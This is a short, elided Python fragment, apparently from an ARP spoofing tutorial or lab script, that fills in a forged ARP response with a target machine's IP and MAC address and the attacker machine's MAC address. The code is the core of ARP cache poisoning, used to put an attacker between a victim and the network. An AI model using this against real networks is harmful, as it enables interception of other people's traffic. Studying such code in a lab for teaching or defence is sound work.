...
def spoof_target():
    ...
    my_arp_response.pdst = "192.168.13.128"  # TARGET MACHINE IP ADDRESS
    my_arp_response.hwdst = "00:0c:29:9d:d9:97"  # TARGET MACHINE MAC ADDRESS
    my_arp_response.hwsrc = "00:0c:29:97:05:57"  # ATTACKER MACHINE MAC ADDRESS
